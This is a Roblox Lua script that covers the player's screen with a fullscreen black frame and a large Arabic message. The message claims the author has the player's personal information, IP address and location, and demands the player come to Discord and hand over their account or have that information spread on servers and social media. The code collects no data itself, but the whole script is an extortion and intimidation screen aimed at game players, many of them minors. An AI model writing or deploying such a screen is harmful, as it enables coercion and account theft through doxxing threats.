-- Create the ScreenGui, Frame, and UI elements
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
local blockingFrame = Instance.new("Frame")
local notificationText = Instance.new("TextLabel")
local rejoinButton = Instance.new("TextButton")

-- Set up the ScreenGui
screenGui.Parent = playerGui

-- Set up the Frame
blockingFrame.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
blockingFrame.Position = UDim2.new(0, 0, 0, 0)
blockingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
blockingFrame.BackgroundTransparency = 0 -- Semi-transparent
blockingFrame.Visible = true
blockingFrame.Parent = screenGui

-- Set up the TextLabel for notification message
notificationText.Size = UDim2.new(1, 0, 0.4, 0) -- Take up some vertical space
notificationText.Position = UDim2.new(0, 0, 0.3, 0) -- Centered vertically
notificationText.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
notificationText.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
notificationText.TextSize = 36 -- Large text size
notificationText.Text = "معلوماتك كلها جتني و الايبي و موقعك و كل حاجه الي ابيه منك تعال دسكورد و عطني حسابك ولا معلوماتك راح انشرها في السيرفرات و التواصل الاجتماعي" -- Your message
notificationText.TextWrapped = true -- Wrap text
notificationText.Parent = blockingFrame
